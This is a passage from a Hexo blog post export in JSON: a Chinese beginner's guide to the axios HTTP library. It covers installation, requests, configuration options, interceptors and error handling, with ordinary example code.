介绍</a>\n<a href=\"#requestConfig\">4. 请求配置</a>\n<a href=\"#response\">5. 响应结构</a>\n<a href=\"#defaultConfig\">6. 默认配置</a>\n<a href=\"#interceptors\">7. 拦截器</a>\n<a href=\"#handleErr\">8. 错误处理</a>\n<a href=\"#applicationForm\">9. 使用 application/x-www-form-urlencoded 格式的请求参数</a>\n<a href=\"#notes\">10. 使用必看</a>\n\n#### <a name=\"install\">1、安装</a>\n\n- `使用 npm：`\n```\n$ npm install axios\n```\n- `使用 cdn：`\n```\n<script src=\"https://unpkg.com/axios/dist/axios.min.js\"></script>\n\n```\n\n#### <a name=\"example\">2、官方示例</a>\n\n- `执行 GET 请求：`\n  ```js\n  // 为给定 ID 的 user 创建请求\n  axios.get('/user?ID=12345')\n  .then((res) => {\n    console.log(res);\n  })\n  .catch((err) => {\n    console.log(err)\n  });\n\n  // 同样的，上面的请求可以这样做\n  axios.get('/user', {\n    params: {\n      ID: 123\n    }\n  })\n  .then((res) => {\n    console.log(res);\n  })\n  .catch((err) => {\n    console.log(err);\n  });\n  ```\n\n- `执行 POST 请求：`\n  ```js\n  axios.post('/user', {\n    firstName: 'Fred',\n    lastName: 'Flintstone'\n  })\n  .then((res) => {\n    console.log(res);\n  })\n  .catch((err) => {\n    console.log(err);\n  });\n  ```\n\n- `执行多个并发请求：`\n  ```js\n  function getUserAccount() {\n    return axios.get('/user/12345');\n  }\n\n  function getUserPermissions() {\n    return axios.get('/user/12345/permissions');\n  }\n\n  axios.all([getUserAccount(), getUserPermissions()])\n  .then(axios.spread((acct, perms) => {\n    // 两个请求现在都执行完成\n  }));\n  ```\n\n#### <a name=\"apiIntro\">3、API 介绍</a>\n\n- `可以通过向 axios 传递相关配置来创建请求：`\n\n  axios(config)\n  ```js\n  // 发送 POST 请求\n  axios({\n    method: 'post',\n    url: '/user/12345',\n    data: {\n      firstName: 'Fred',\n      lastName: 'Flintstone'\n    },\n    ...\n  });\n  ```\n  ```js\n  // GET 请求远程图片\n  axios({\n    method:'get',\n    url:'http://bit.ly/2mTM3nY',\n    responseType:'stream'\n  })\n  .then((response) => {\n  response.data.pipe(fs.createWriteStream('ada_lovelace.jpg'))\n  });\n  ```\n  axios(url[, config])\n  ```js\n    // 发送 GET 请求（默认的方法）\n    axios('/user/12345');\n```\n\n- `请求方法的别名：`\n\n  为方便起见，为所有支持的请求方法提供了别名\n  ```js\n  axios.request(config)\n  axios.get(url[, config])\n  axios.delete(url[, config])\n  axios.head(url[, config])\n  axios.post(url[, data[, config]])\n  axios.put(url[, data[, config]])\n  axios.patch(url[, data[, config]])\n  ```\n  在使用别名方法时， url、method、data 这些属性都不必在配置中指定。\n\n- `处理并发请求：`\n  ```js\n  axios.all(iterable)\n  axios.spread(callback)\n  ```\n\n- `创建 axios 实例：`\n  可以使用自定义配置新建一个 axios 实例\n  ```js\n  // axios.create([config])\n  var instance = axios.create({\n    baseURL: 'https://some-domain.com/api/',\n    timeout: 1000,\n    headers: {'X-Custom-Header': 'foobar'}\n  });\n  ```\n\n- `实例的方法：`;\n  以下是可用的实例方法。指定的配置将与实例的配置合并\n  ```\n  axios#request(config)\n  axios#get(url[, config])\n  axios#delete(url[, config])\n  axios#head(url[, config])\n  axios#post(url[, data[, config]])\n  axios#put(url[, data[, config]])\n  axios#patch(url[, data[, config]])\n  ```\n\n#### <a name=\"requestConfig\">4、请求配置</a>\n\n- `这些是创建请求时可以用的配置选项。只有 url 是必需的。如果没有指定 method，请求将默认使用 get 方法：`\n  ```js\n  {\n    // `url` 是用于请求的服务器 URL\n    url: '/user',\n\n    // `method` 是创建请求时使用的方法\n    method: 'get', // 默认是 get\n\n    // `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。\n    // 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL\n    baseURL: 'https://some-domain.com/api/',\n\n    // `transformRequest` 允许在向服务器发送前，修改请求数据\n    // 只能用在 'PUT', 'POST' 和 'PATCH' 这几个请求方法\n    // 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream\n    transformRequest: [function (data) {\n      // 对 data 进行任意转换处理\n\n      return data;\n    }],\n\n    // `transformResponse` 在传递给 then/catch 前，允许修改响应数据\n    transformResponse: [function (data) {\n      // 对 data 进行任意转换处理\n\n      return data;\n    }],\n\n    // `headers` 是即将被发送的自定义请求头\n    headers: {'X-Requested-With': 'XMLHttpRequest'},\n\n    // `params` 是即将与请求一起发送的 URL 参数\n    // 必须是一个无格式对象(plain object)或 URLSearchParams 对象\n    params: {\n      ID: 12345\n    },\n\n    // `paramsSerializer` 是一个负责 `params` 序列化的函数\n    // (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)\n    paramsSerializer: function(params) {\n      return Qs.stringify(params, {arrayFormat: 'brackets'})\n    },\n\n    // `data` 是作为请求主体被发送的数据\n    // 只适用于这些请求方法 'PUT', 'POST', 和 'PATCH'\n    // 在没有设置 `transformRequest` 时，必须是以下类型之一：\n    // - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams\n    // - 浏览器专属：FormData, File, Blob\n    // - Node 专属： Stream\n    data: {\n      firstName: 'Fred'\n    },\n\n    // `timeout` 指定请求超时的毫秒数(0 表示无超时时间)\n    // 如果请求话费了超过 `timeout` 的时间，请求将被中断\n    timeout: 1000,\n\n    // `withCredentials` 表示跨域请求时是否需要使用凭证\n    withCredentials: false, // 默认的\n\n    // `adapter` 允许自定义处理请求，以使测试更轻松\n    // 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).\n    adapter: function (config) {\n      /* ... */\n    },\n\n    // `auth` 表示应该使用 HTTP 基础验证，并提供凭据\n    // 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` ,\n    // 设置的自定义 `Authorization`头\n    auth: {\n      username: 'janedoe',\n      password: 's00pers3cret'\n    },\n\n    // `responseType` 表示服务器响应的数据类型，\n    // 可以是 'arraybuffer', 'blob', 'document', 'json', 'text', 'stream'\n    responseType: 'json', // 默认的\n\n    // `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称\n    xsrfCookieName: 'XSRF-TOKEN', // default\n\n    // `xsrfHeaderName` 是承载 xsrf token 的值的 HTTP 头的名称\n    xsrfHeaderName: 'X-XSRF-TOKEN', // 默认的\n\n    // `onUploadProgress` 允许为上传处理进度事件\n    onUploadProgress: function (progressEvent) {\n      // 对原生进度事件的处理\n    },\n\n    // `onDownloadProgress` 允许为下载处理进度事件\n    onDownloadProgress: function (progressEvent) {\n      // 对原生进度事件的处理\n    },\n\n    // `maxContentLength` 定义允许的响应内容的最大尺寸\n    maxContentLength: 2000,\n\n    // `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。\n    // 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，\n    // promise 将被 resolve; 否则，promise 将被 rejecte\n    validateStatus: function (status) {\n      return status >= 200 && status < 300; // 默认的\n    },\n\n    // `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目\n    // 如果设置为0，将不会 follow 任何重定向\n    maxRedirects: 5, // 默认的\n\n    // `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。\n    // 允许像这样配置选项：\n    // `keepAlive` 默认没有启用\n    httpAgent: new http.Agent({ keepAlive: true }),\n    httpsAgent: new https.Agent({ keepAlive: true }),\n\n    // 'proxy' 定义代理服务器的主机名称和端口\n    // `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据\n    // 这将会设置一个 `Proxy-Authorization` 头，\n    // 覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。\n    proxy: {\n      host: '127.0.0.1',\n      port: 9000,\n      auth: : {\n        username: 'mikeymike',\n        password: 'rapunz3l'\n      }\n    },\n\n    // `cancelToken` 指定用于取消请求的 cancel token\n    // （查看后面的 Cancellation 这节了解更多）\n    cancelToken: new CancelToken(function (cancel) {\n    })\n  }\n  ```\n\n#### <a name=\"response\">5、响应结构</a>\n\n- `某个请求的响应包含以下信息：`\n  ```js\n  {\n    // `data` 由服务器提供的响应\n    data: {},\n\n    // `status` 来自服务器响应的 HTTP 状态码\n    status: 200,\n\n    // `statusText` 来自服务器响应的 HTTP 状态信息\n    statusText: 'OK',\n\n    // `headers` 服务器响应的头\n    headers: {},\n\n    // `config` 是为请求提供的配置信息\n    config: {}\n  }\n  ```\n  使用 then 时，你将接收下面这样的响应：\n  ```js\n  axios.get('/user/12345')\n  .then((response) => {\n    console.log(response.data);\n    console.log(response.status);\n    console.log(response.statusText);\n    console.log(response.headers);\n    console.log(response.config);\n  });\n  ```\n \n#### <a name=\"#defaultConfig\">6、默认配置</a>\n \n> 指定将被用在各个请求的配置默认值\n\n- `axios 全局默认值：`\n  ```js\n  axios.defaults.baseURL = 'https://api.example.com';\n  axios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\n  axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\n  ```\n\n- `自定义实例的默认值：`\n  ```js\n  // 1、创建实例时设置配置的默认值\n  var instance = axios.create({\n    baseURL: 'https://api.example.com'\n  });\n\n  // 2、在实例已创建后修改默认值\n  instance.defaults.headers.common['Authorization'] = AUTH_TOKEN;\n  ```\n\n- `配置的优先顺序:`\n  配置会以一个优先顺序进行合并。这个顺序是：在 lib/defaults.js 找到的库的默认值，然后是实例的 defaults 属性，最后是请求的 config 参数。后者将优先于前者。这里是一个例子：\n  ```js\n  // 使用由库提供的配置的默认值来创建实例\n  // 此时超时配置的默认值是 `0`\n  var instance = axios.create();\n\n  // 覆写库的超时默认值\n  // 现在，在超时前，所有请求都会等待 2.5 秒\n  instance.defaults.timeout = 2500;\n\n  // 为已知需要花费很长时间的请求覆写超时设置\n  instance.get('/longRequest', {\n    timeout: 5000\n  });\n  ```\n\n#### <a name=\"interceptors\">7、拦截器</a>\n\n- `在请求或响应被 then 或 catch 处理前拦截它们：`\n  ```js\n  // 添加请求拦截器\n  axios.interceptors.request.use((config) => {\n    // 在发送请求之前做些什么\n    return config;\n  }, (error) => {\n    // 对请求错误做些什么\n    return Promise.reject(error);\n  });\n\n  // 添加响应拦截器\n  axios.interceptors.response.use((response) => {\n    // 对响应数据做点什么\n    return response;\n  }, (error) => {\n    // 对响应错误做点什么\n    return Promise.reject(error);\n  });\n  ```\n\n- `如果你想在稍后移除拦截器，可以这样：`\n  ```js\n  // 使用拦截器\n  var myInterceptor = axios.interceptors.request.use(function () {/*...*/});\n\n  // 移除拦截器\n  axios.interceptors.request.eject(myInterceptor);\n  ```\n\n- `可以为自定义 axios 实例添加拦截器：`\n  ```js\n  var instance = axios.create();\n  instance.interceptors.request.use(function () {/*...*/});\n  ```\n\n#### <a name=\"handleErr\">8、错误处理</a>\n\n- `常见的错误处理方式：`\n  ```js\n  axios.get('/user/12345')\n    .catch((error) => {\n      if (error.response) {\n        // 请求已发出，但服务器响应的状态码不在 2xx 范围内\n        console.log(error.response.data);\n        console.log(error.response.status);\n        console.log(error.response.headers);\n      } else {\n        // Something happened in setting up the request that triggered an Error\n        console.log('Error', error.message);\n      }\n      console.log(error.config);\n    });\n  ```\n- `可以使用 validateStatus 配置选项定义一个自定义 HTTP 状态码的错误范围：`\n  ```js\n  axios.get('/user/12345', {\n    validateStatus: function (status) {\n      return status < 500; // 状态码在大于或等于500时才会 reject\n    }\n  })\n  ```\n\n#### <a name=\"applicationForm\">9、使用 `application/x-www-form-urlencoded` 格式的请求参数</a>\n\n\n> 默认情况下，axios将JavaScript对象序列化为JSON，即 `application/json` 。要以 `application/x-www-form-urlencoded` 格式发送数据，您可以使用以下选项之一。\n\n- `浏览器`\n  在浏览器中，您可以使用URLSearchParams API，如下所示：\n  ```js\n  var params = new URLSearchParams();\n  params.append('param1', 'value1');\n  params.append('param2', 'value2');\n  axios.post('/foo', params);\n\n  // 值得注意的是，并不是所有的浏览器都支持 `URLSearchParams`，\n  // 但是可以借助 `polyfill` 来解决\n  ```\n  也可以使用 [`qs`](https://github.com/ljharb/qs) 库来编码请求参数：\n  ```js\n  var qs = import 'qs';\n  axios.post('/foo', qs.stringify({ 'bar': 123 }));\n  ```\n\n- `Node.js`\n  在 `node.js` 中，可以使用 [`querystring`](https://nodejs.org/api/querystring.html) 模块：\n  ```js\n  var querystring = import 'querystring';\n  axios.post('http://something.com/', querystring.stringify({ foo: 'bar' }));\n\n  // 当然也可以使用 `qs` 库\n  ```\n\n#### <a name=\"notes\">10、使用必看</a>\n\n- `更新说明：`\n  在axios达到1.0版本之前，重大更改将以新的次要版本发布。例如0.5.1和0.5.4将具有相同的API，但0.6.0将具有重大变化。\n\n- `Promise：`\n  axios依赖于原生ES6 `Promise` 实现的支持。如果您的环境不支持ES6 Promise，则可以使用 [polyfill](https://github.com/stefanpenner/es6-promise)。\n\n<p style=\"text-align: right\">参考文档 [axios](https://www.npmjs.com/package/axios)</p>","source":"_posts/0809017_axios简易上手.md","raw":"---\nid: 0809017\ntitle: axios 简易上手\ndate: 2017-12-23 10:23:18\ntags:\n  - ES6\n  - ajax\n  - Promise\ncategories:\n---\n\n> Promise based HTTP client for the browser and node.js.（`axios` 是一个基于 `Promise` 的 `HTTP` 库，可以用在 `浏览器` 和 `node.js` 中。）\n\n<a href=\"#install\">1. 安装</a>\n<a href=\"#example\">2. 官网示例</a>\n<a href=\"#apiIntro\">3. API 介绍</a>\n<a href=\"#requestConfig\">4. 请求配置</a>\n<a href=\"#response\">5. 响应结构</a>\n<a href=\"#defaultConfig\">6. 默认配置</a>\n<a href=\"#interceptors\">7. 拦截器</a>\n<a href=\"#handleErr\">8. 错误处理</a>\n<a href=\"#applicationForm\">9. 使用 application/x-www-form-urlencoded 格式的请求参数</a>\n<a href=\"#notes\">10. 使用必看</a>\n\n#### <a name=\"install\">1、安装</a>\n\n- `使用 npm：`\n```\n$ npm install axios\n```\n- `使用 cdn：`\n```\n<script src=\"https://unpkg.com/axios/dist/axios.min.js\"></script>\n\n```\n\n#### <a name=\"example\">2、官方示例</a>\n\n- `执行 GET 请求：`\n  ```js\n  // 为给定 ID 的 user 创建请求\n  axios.get('/user?ID=12345')\n  .then((res) => {\n    console.log(res);\n  })\n  .catch((err) => {\n    console.log(err)\n  });\n\n  // 同样的，上面的请求可以这样做\n  axios.get('/user', {\n    params: {\n      ID: 123\n    }\n  })\n  .then((res) => {\n    console.log(res);\n  })\n  .catch((err) => {\n    console.log(err);\n  });\n  ```\n\n- `执行 POST 请求：`\n  ```js\n  axios.post('/user', {\n    firstName: 'Fred',\n    lastName: 'Flintstone'\n  })\n  .then((res) => {\n    console.log(res);\n  })\n  .catch((err) => {\n    console.log(err);\n  });\n  ```\n\n- `执行多个并发请求：`\n  ```js\n  function getUserAccount() {\n    return axios.get('/user/12345');\n  }\n\n  function getUserPermissions() {\n    return axios.get('/user/12345/permissions');\n  }\n\n  axios.all([getUserAccount(), getUserPermissions()])\n  .then(axios.spread((acct, perms) => {\n    // 两个请求现在都执行完成\n  }));\n  ```\n\n#### <a name=\"apiIntro\">3、API 介绍</a>\n\n- `可以通过向 axios 传递相关配置来创建请求：`\n\n  axios(config)\n  ```js\n  // 发送 POST 请求\n  axios({\n    method: 'post',\n    url: '/user/12345',\n    data: {\n      firstName: 'Fred',\n      lastName: 'Flintstone'\n    },\n    ...\n  });\n  ```\n  ```js\n  // GET 请求远程图片\n  axios({\n    method:'get',\n    url:'http://bit.ly/2mTM3nY',\n    responseType:'stream'\n  })\n  .then((response) => {\n  response.data.pipe(fs.createWriteStream('ada_lovelace.jpg'))\n  });\n  ```\n  axios(url[, config])\n  ```js\n    // 发送 GET 请求（默认的方法）\n    axios('/user/12345');\n```\n\n- `请求方法的别名：`\n\n  为方便起见，为所有支持的请求方法提供了别名\n  ```js\n  axios.request(config)\n  axios.get(url[, config])\n  axios.delete(url[, config])\n  axios.head(url[, config])\n  axios.post(url[, data[, config]])\n  axios.put(url[, data[, config]])\n  axios.patch(url[, data[, config]])\n  ```\n  在使用别名方法时， url、method、data 这些属性都不必在配置中指定。\n\n- `处理并发请求：`\n  ```js\n  axios.all(iterable)\n  axios.spread(callback)\n  ```\n\n- `创建 axios 实例：`\n  可以使用自定义配置新建一个 axios 实例\n  ```js\n  // axios.create([config])\n  var instance = axios.create({\n    baseURL: 'https://some-domain.com/api/',\n    timeout: 1000,\n    headers: {'X-Custom-Header': 'foobar'}\n  });\n  ```\n\n- `实例的方法：`;\n  以下是可用的实例方法。指定的配置将与实例的配置合并\n  ```\n  axios#request(config)\n  axios#get(url[, config])\n  axios#delete(url[, config])\n  axios#head(url[, config])\n  axios#post(url[, data[, config]])\n  axios#put(url[, data[, config]])\n  axios#patch(url[, data[, config]])\n  ```\n\n#### <a name=\"requestConfig\">4、请求配置</a>\n\n- `这些是创建请求时可以用的配置选项。只有 url 是必需的。如果没有指定 method，请求将默认使用 get 方法：`\n  ```js\n  {\n    // `url` 是用于请求的服务器 URL\n    url: '/user',\n\n    // `method` 是创建请求时使用的方法\n    method: 'get', // 默认是 get\n\n    // `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。\n    // 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL\n    baseURL: 'https://some-domain.com/api/',\n\n    // `transformRequest` 允许在向服务器发送前，修改请求数据\n    // 只能用在 'PUT', 'POST' 和 'PATCH' 这几个请求方法\n    // 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream\n    transformRequest: [function (data) {\n      // 对 data 进行任意转换处理\n\n      return data;\n    }],\n\n    // `transformResponse` 在传递给 then/catch 前，允许修改响应数据\n    transformResponse: [function (data) {\n      // 对 data 进行任意转换处理\n\n      return data;\n    }],\n\n    // `headers` 是即将被发送的自定义请求头\n    headers: {'X-Requested-With': 'XMLHttpRequest'},\n\n    // `params` 是即将与请求一起发送的 URL 参数\n    // 必须是一个无格式对象(plain object)或 URLSearchParams 对象\n    params: {\n      ID: 12345\n    },\n\n    // `paramsSerializer` 是一个负责 `params` 序列化的函数\n    // (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)\n    paramsSerializer: function(params) {\n      return Qs.stringify(params, {arrayFormat: 'brackets'})\n    },\n\n    // `data` 是作为请求主体被发送的数据\n    // 只适用于这些请求方法 'PUT', 'POST', 和 'PATCH'\n    // 在没有设置 `transformRequest` 时，必须是以下类型之一：\n    // - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams\n    // - 浏览器专属：FormData, File, Blob\n    // - Node 专属： Stream\n    data: {\n      firstName: 'Fred'\n    },\n\n    // `timeout` 指定请求超时的毫秒数(0 表示无超时时间)\n    // 如果请求话费了超过 `timeout` 的时间，请求将被中断\n    timeout: 1000,\n\n    // `withCredentials` 表示跨域请求时是否需要使用凭证\n    withCredentials: false, // 默认的\n\n    // `adapter` 允许自定义处理请求，以使测试更轻松\n    // 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).\n    adapter: function (config) {\n      /* ... */\n    },\n\n    // `auth` 表示应该使用 HTTP 基础验证，并提供凭据\n    // 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` ,\n    // 设置的自定义 `Authorization`头\n    auth: {\n      username: 'janedoe',\n      password: 's00pers3cret'\n    },\n\n    // `responseType` 表示服务器响应的数据类型，\n    // 可以是 'arraybuffer', 'blob', 'document', 'json', 'text', 'stream'\n    responseType: 'json', // 默认的\n\n    // `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称\n    xsrfCookieName: 'XSRF-TOKEN', // default\n\n    // `xsrfHeaderName` 是承载 xsrf token 的值的 HTTP 头的名称\n    xsrfHeaderName: 'X-XSRF-TOKEN', // 默认的\n\n    // `onUploadProgress` 允许为上传处理进度事件\n    onUploadProgress: function (progressEvent) {\n      // 对原生进度事件的处理\n    },\n\n    // `onDownloadProgress` 允许为下载处理进度事件\n    onDownloadProgress: function (progressEvent) {\n      // 对原生进度事件的处理\n    },\n\n    // `maxContentLength` 定义允许的响应内容的最大尺寸\n    maxContentLength: 2000,\n\n    // `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。\n    // 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，\n    // promise 将被 resolve; 否则，promise 将被 rejecte\n    validateStatus: function (status) {\n      return status >= 200 && status < 300; // 默认的\n    },\n\n    // `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目\n    // 如果设置为0，将不会 follow 任何重定向\n    maxRedirects: 5, // 默认的\n\n    // `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。\n    // 允许像这样配置选项：\n    // `keepAlive` 默认没有启用\n    httpAgent: new http.Agent({ keepAlive: true }),\n    httpsAgent: new https.Agent({ keepAlive: true }),\n\n    // 'proxy' 定义代理服务器的主机名称和端口\n    // `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据\n    // 这将会设置一个 `Proxy-Authorization` 头，\n    // 覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。\n    proxy: {\n      host: '127.0.0.1',\n      port: 9000,\n      auth: : {\n        username: 'mikeymike',\n        password: 'rapunz3l'\n      }\n    },\n\n    // `cancelToken` 指定用于取消请求的 cancel token\n    // （查看后面的 Cancellation 这节了解更多）\n    cancelToken: new CancelToken(function (cancel) {\n    })\n  }\n  ```\n\n#### <a name=\"response\">5、响应结构</a>\n\n- `某个请求的响应包含以下信息：`\n  ```js\n  {\n    // `data` 由服务器提供的响应\n    data: {},\n\n    // `status` 来自服务器响应的 HTTP 状态码\n    status: 200,\n\n    // `statusText` 来自服务器响应的 HTTP 状态信息\n    statusText: 'OK',\n\n    // `headers` 服务器响应的头\n    headers: {},\n\n    // `config` 是为请求提供的配置信息\n    config: {}\n  }\n  ```\n  使用 then 时，你将接收下面这样的响应：\n  ```js\n  axios.get('/user/12345')\n  .then((response) => {\n    console.log(response.data);\n    console.log(response.status);\n    console.log(response.statusText);\n    console.log(response.headers);\n    console.log(response.config);\n  });\n  ```\n \n#### <a name=\"#defaultConfig\">6、默认配置</a>\n \n> 指定将被用在各个请求的配置默认值\n\n- `axios 全局默认值：`\n  ```js\n  axios.defaults.baseURL = 'https://api.example.com';\n  axios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\n  axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\n  ```\n\n- `自定义实例的默认值：`\n  ```js\n  // 1、创建实例时设置配置的默认值\n  var instance = axios.create({\n    baseURL: 'https://api.example.com'\n  });\n\n  // 2、在实例已创建后修改默认值\n  instance.defaults.headers.common['Authorization'] = AUTH_TOKEN;\n  ```\n\n- `配置的优先顺序:`\n  配置会以一个优先顺序进行合并。这个顺序是：在 lib/defaults.js 找到的库的默认值，然后是实例的 defaults 属性，最后是请求的 config 参数。后者将优先于前者。这里是一个例子：\n  ```js\n  // 使用由库提供的配置的默认值来创建实例\n  // 此时超时配置的默认值是 `0`\n  var instance = axios.create();\n\n  // 覆写库的超时默认值\n  // 现在，在超时前，所有请求都会等待 2.5 秒\n  instance.defaults.timeout = 2500;\n\n  // 为已知需要花费很长时间的请求覆写超时设置\n  instance.get('/longRequest', {\n    timeout: 5000\n  });\n  ```\n\n#### <a name=\"interceptors\">7、拦截器</a>\n\n- `在请求或响应被 then 或 catch 处理前拦截它们：`\n  ```js\n  // 添加请求拦截器\n  axios.interceptors.request.use((config) => {\n    // 在发送请求之前做些什么\n    return config;\n  }, (error) => {\n    // 对请求错误做些什么\n    return Promise.reject(error);\n  });\n\n  // 添加响应拦截器\n  axios.interceptors.response.use((response) => {\n    // 对响应数据做点什么\n    return response;\n  }, (error) => {\n    // 对响应错误做点什么\n    return Promise.reject(error);\n  });\n  ```\n\n- `如果你想在稍后移除拦截器，可以这样：`\n  ```js\n  // 使用拦截器\n  var myInterceptor = axios.interceptors.request.use(function () {/*...*/});\n\n  // 移除拦截器\n  axios.interceptors.request.eject(myInterceptor);\n  ```\n\n- `可以为自定义 axios 实例添加拦截器：`\n  ```js\n  var instance = axios.create();\n  instance.interceptors.request.use(function () {/*...*/});\n  ```\n\n#### <a name=\"handleErr\">8、错误处理</a>\n\n- `常见的错误处理方式：`\n  ```js\n  axios.get('/user/12345')\n    .catch((error) => {\n      if (error.response) {\n        // 请求已发出，但服务器响应的状态码不在 2xx 范围内\n        console.log(error.response.data);\n        console.log(error.response.status);\n        console.log(error.response.headers);\n      } else {\n        // Something happened in setting up the request that triggered an Error\n        console.log('Error', error.message);\n      }\n      console.log(error.config);\n    });\n  ```\n- `可以使用 validateStatus 配置选项定义一个自定义 HTTP 状态码的错误范围：`\n  ```js\n  axios.get('/user/12345', {\n    validateStatus: function (status) {\n      return status < 500; // 状态码在大于或等于500时才会 reject\n    }\n  })\n  ```\n\n#### <a name=\"applicationForm\">9、使用 `application/x-www-form-urlencoded` 格式的请求参数</a>\n\n\n> 默认情况下，axios将JavaScript对象序列化为JSON，即 `application/json` 。要以 `application/x-www-form-urlencoded` 格式发送数据，您可以使用以下选项之一。\n\n- `浏览器`\n  在浏览器中，您可以使用URLSearchParams API，如下所示：\n  ```js\n  var params = new URLSearchParams();\n  params.append('param1', 'value1');\n  params.append('param2', 'value2');\n  axios.post('/foo', params);\n\n  // 值得注意的是，并不是所有的浏览器都支持 `URLSearchParams`，\n  // 但是可以借助 `polyfill` 来解决\n  ```\n  也可以使用 [`qs`](https://github.com/ljharb/qs) 库来编码请求参数：\n  ```js\n  var qs = import 'qs';\n  axios.post('/foo', qs.stringify({ 'bar': 123 }));\n  ```\n\n- `Node.js`\n  在 `node.js` 中，可以使用 [`querystring`](https://nodejs.org/api/querystring.html) 模块：\n  ```js\n  var querystring = import 'querystring';\n  axios.post('http://something.com/', querystring.stringify({ foo: 'bar' }));\n\n  // 当然也可以使用 `qs` 库\n  ```\n\n#### <a name=\"notes\">10、使用必看</a>\n\n- `更新说明：`\n  在axios达到1.0版本之前，重大更改将以新的次要版本发布。例如0.5.1和0.5.4将具有相同的API，但0.6.0将具有重大变化。\n\n- `Promise：`\n  axios依赖于原生ES6 `Promise` 实现的支持。如果您的环境不支持ES6 Promise，则可以使用 [polyfill](https://github.com/stefanpenner/es6-promise)。\n\n<p style=\"text-align: right\">参考文档 [axios](https://www.npmjs.com/package/axios)</p>","slug":"0809017_axios简易上手","published":1,"updated":"2018-03-26T12:19:08.175Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvwj002zs4c0la8otf4p","content":"<blockquote>\n<p>Promise based HTTP client for the browser and node.js.（<code>axios</code> 是一个基于 <code>Promise</code> 的 <code>HTTP</code> 库，可以用在 <code>浏览器</code> 和 <code>node.js</code> 中。）</p>\n</blockquote>\n<p><a href=\"#install\">1. 安装</a><br><a href=\"#example\">2. 官网示例</a><br><a href=\"#apiIntro\">3. API 介绍</a><br><a href=\"#requestConfig\">4. 请求配置</a><br><a href=\"#response\">5. 响应结构</a><br><a href=\"#defaultConfig\">6. 默认配置</a><br><a href=\"#interceptors\">7. 拦截器</a><br><a href=\"#handleErr\">8. 错误处理</a><br><a href=\"#applicationForm\">9. 使用 application/x-www-form-urlencoded 格式的请求参数</a><br><a href=\"#notes\">10. 使用必看</a></p>\n<h4 id=\"1、安装\"><a href=\"#1、安装\" class=\"headerlink\" title=\"1、安装\"></a><a name=\"install\">1、安装</a></h4><ul>\n<li><p><code>使用 npm：</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install axios</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>使用 cdn：</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"2、官方示例\"><a href=\"#2、官方示例\" class=\"headerlink\" title=\"2、官方示例\"></a><a name=\"example\">2、官方示例</a></h4><ul>\n<li><p><code>执行 GET 请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 为给定 ID 的 user 创建请求</span></span><br><span class=\"line\">axios.get(<span class=\"string\">'/user?ID=12345'</span>)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(err)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 同样的，上面的请求可以这样做</span></span><br><span class=\"line\">axios.get(<span class=\"string\">'/user'</span>, &#123;</span><br><span class=\"line\">  params: &#123;</span><br><span class=\"line\">    